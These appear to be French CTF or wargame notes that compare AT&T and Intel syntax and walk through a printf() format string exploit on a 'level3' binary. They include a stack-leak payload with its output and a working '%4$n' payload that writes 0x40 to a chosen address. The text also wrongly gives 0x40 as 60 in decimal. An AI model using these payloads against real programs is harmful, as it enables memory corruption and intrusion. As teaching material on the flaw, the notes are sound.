## AT&T vs Intel

syntaxe AT&T

`mov source, destination`

syntaxe Intel

`mov destination, source`

## Format String Exploitation

Si on ne donne pas explicitement d'arguments variadiques apres avoir indique un format tel que %x, printf() parcours la pile dans l'ordre ce qui nous donne un acces significatif a la Pile.

Exemple avec le binaire level3:
VV
`(python -c 'print "AAAA" + ".%x"*8') | ./level3`

-> `AAAA.200.b7fd1ac0.b7ff37d0.41414141.2e78252e.252e7825.78252e78.2e78252e`

printf() affiche notre chaine "AAAA" puis cherche les arguments affilies aux formats. Vu qu'on ne lui a pas fournis ces arguments, printf() ne contente d'afficher ce qu'il a sous la main, dans la pile.
Et surprise, on retrouve notre chaine "AAAA" -> "41414141".

D'un autre cote, l'argument `%n` permet de stocker le nombre de caracteres lus dans un argument donne. On va donc pouvoir exploiter cette faille et changer "AAAA" par une addresse.

Il nous a fallu 4 `%x` pour afficher notre chaine. Heureusement on peut indiquer a printf de ne pas suivre l'ordre des arguments variadiques.

`%4$n` indique qu'il faut aller cherche le 4eme argument variadique.

Quel interet si `%n` sert uniquement a stocker la sortie du printf() ? Et bien on va pouvoir ecrire autant de caracteres que l'on veut de sorte a reformer la valeur de notre choix. Ici c'est 0x40 soit 60 en decimal.


`(python -c 'print "\x8c\x98\x04\x08" + "%60c" + "%4$n"'; cat) | ./level3`
- "\x8c\x98\x04\x08" est l'adresse que l'on souhaite modifier
- "%60c" sert a afficher 60 whitespaces afin de faire monter le compteur de printf()
- "%4$n" va chercher "\x8c\x98\x04\x08" 4 adresses plus loins et y stocker 60 soit 0x40.

